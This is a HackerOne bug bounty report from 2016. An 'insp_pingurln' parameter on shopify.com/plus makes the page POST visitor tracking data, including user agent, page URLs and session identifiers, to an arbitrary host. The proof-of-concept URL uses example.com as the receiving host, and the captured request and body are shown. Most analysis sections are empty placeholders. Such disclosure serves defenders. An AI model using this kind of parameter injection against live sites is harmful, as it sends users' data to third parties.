# CSRF on https://shopify.com/plus

## Metadata
- **Source:** HackerOne
- **Report:** 114430 | https://hackerone.com/reports/114430
- **Submitted:** 2016-02-03
- **Reporter:** mdv
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** unknown
- **Vuln:** Information Disclosure
- **CVEs:** None
- **Category:** web-api

## Summary
Hello.
To reproduce this CSRF, visit https://www.shopify.com/plus?insp_pingurln=https://example.com/%23
Will be sent this post request on [example.com](http://example.com/):
```
POST https://example.com/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:44.0) Gecko/20100101 Firefox/44.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-En

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello.
To reproduce this CSRF, visit https://www.shopify.com/plus?insp_pingurln=https://example.com/%23
Will be sent this post request on [example.com](http://example.com/):
```
POST https://example.com/ HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:44.0) Gecko/20100101 Firefox/44.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://www.shopify.com/plus?insp_pingurln=https://example.com/%23
Content-Length: 1058
Origin: https://www.shopify.com
Connection: keep-alive
Host: example.com
```
POST data:
```
w=443176196&uid=1582993167&sid=1116922839&nv=true&u=https%3A%2F%2Fwww.shopify.com%2Fplus%3Finsp_pingurln%3Dhttps%3A%2F%2Fexample.com%2F%2523&or=https%3A%2F%2Fwww.shopify.com&ref=d&title=Enterprise+Ecommerce+Software+-+Scalable+Ecommerce+Platform&pw=1266&ph=629&pad=6&ism=false&dbglvl=3&dbgpad=5&dbgtpad=string&dbggcil=.shopify.com&cloc=undefined&st=4402&dbgk=&jv=4&identity=&targcv%5Blochref%5D=https%3A%2F%2Fwww.shopify.com%2Fplus%3Finsp_pingurln%3Dhttps%3A%2F%2Fexample.com%2F%2523&targcv%5Bdoctitle%5D=Enterprise+Ecommerce+Software+-+Scalable+Ecommerce+Platform&targcv%5Blptitle%5D=Enterprise+Ecommerce+Software+-+Scalable+Ecommerce+Platform&targcv%5Blpurl%5D=https%3A%2F%2Fwww.shopify.com%2Fplus&targcv%5B%24browser%5D%5Bmozilla%5D=true&targcv%5B%24browser%5D%5Bversion%5D=44.0&targcv%5BuserAgent%5D=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A44.0)+Gecko%2F20100101+Firefox%2F44.0&targcv%5Bmobchua%5D=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64%3B+rv%3A44.0)+Gecko%2F20100101+Firefox%2F44.0&targcv%5Bref%5D=d&targcv%5Bnv%5D=true&isvp=false
```
Works only with protocol https.


</details>

---
*Analysed by Claude on 2026-05-24*
